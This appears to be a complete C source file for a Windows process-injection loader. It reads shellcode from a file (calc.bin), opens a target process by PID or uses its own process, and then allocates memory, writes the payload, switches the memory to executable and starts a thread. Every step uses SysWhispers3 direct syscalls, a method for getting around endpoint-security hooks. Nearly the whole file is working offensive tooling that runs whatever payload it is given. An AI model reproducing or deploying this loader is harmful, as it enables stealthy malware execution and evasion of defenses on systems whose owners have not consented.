#define _CRT_SECURE_NO_WARNINGS
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "SysWhispers.h"

/*
In this example SysWhispers3 is used
python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtOpenProcess,NtWaitForSingleObject -o SysWhispers -v
*/
#define NtCurrentProcess() ((HANDLE)-1)
#define SUCCESS 0x00



BOOL pExe(IN HANDLE hProcess, IN PBYTE sc, IN size_t sc_size) {
    //SYSCALLS scls = { 0 };
    PVOID addr = NULL;
    ULONG old = 0;
    SIZE_T written = 0, scSize = sc_size;
    HANDLE hThread = NULL;
    NTSTATUS status;


    //Allocate some memory
    status = NtAllocVM(hProcess, &addr, 0, &scSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (status != SUCCESS) {
        printf("Failed in allocation: 0x%X\n", status);
        return FALSE;
    }

    //Write the payload
    status = NtWrVM(hProcess, addr, sc, sc_size, &written);
    if (status != SUCCESS) {
        printf("Failed in writing: 0x%X\n", status);
        return FALSE;
    }

    //Change protection
    status = NtProtVM(hProcess, &addr, &scSize, PAGE_EXECUTE_READ, &old);
    if (status != SUCCESS) {
        printf("Faild switching protection: 0x%X\n", status);
        return FALSE;
    }

    //Create execution thread
    status = NtCTEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, addr, NULL, NULL, NULL, NULL, NULL, NULL);
    if (status != SUCCESS) {
        printf("Failed creating thread: 0x%X\n", status);
        return FALSE;
    }

    NtWFSO(hThread, FALSE, INFINITE);
    printf("Finished!\n");
    return TRUE;
}

BOOL Open(IN DWORD pid, OUT PHANDLE hProc) {
    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)pid;
    cid.UniqueThread = (HANDLE)0;

    OBJECT_ATTRIBUTES oattr;
    InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtOp(hProc, PROCESS_ALL_ACCESS, &oattr, &cid);
    if (status != SUCCESS) {
        printf("Open proc failed: 0x%X\n", status);
        return FALSE;
    }
    return TRUE;
}


//Temp function to read the shellcode from a file
int ReadF(const char* file_path, long* file_size, char** read_buffer) {
    FILE* file;

    file = fopen(file_path, "rb");
    if (file == NULL) {
        printf("Error opening file: %s", file_path);
        *file_size = 0;
        return 1;
    }

    fseek(file, 0, SEEK_END);
    *file_size = ftell(file);
    rewind(file);

    *read_buffer = (char*)malloc(*file_size * sizeof(char));
    if (*read_buffer == NULL) {
        printf("Memory allocation failed");
        fclose(file);
        return 1;
    }

    fread(*read_buffer, 1, *file_size, file);
    fclose(file);
    return 0;
}



int main(int argc, char* argv[])
{
    long sc_size;
    char* sc;
    ReadF("C:\\Users\\nullb1t3\\Desktop\\calc.bin", &sc_size, &sc);

    HANDLE hProc = NULL;
    if (argc == 2) {
        DWORD pid = atoi(argv[1]);
        if (pid == 0 && argv[1][0] != '0') {
            printf("Invalid input: %s is not a valid integer.\n", argv[1]);
            return 1;
        }

        printf("Targeting PID: %d\n", pid);
        if (!Open(pid, &hProc)) {
            printf("Failed opening!\n");
            return 1;
        }
    }
    else {
        printf("Targeting the local process!\n");
        hProc = NtCurrentProcess();
        //printf("Handle: 0x%p", hProc);
        //getchar();
    }

    if (!pExe(hProc, sc, sc_size)) {
        printf("Injection failed!\n");
        return 1;
    }

    return 0;
}
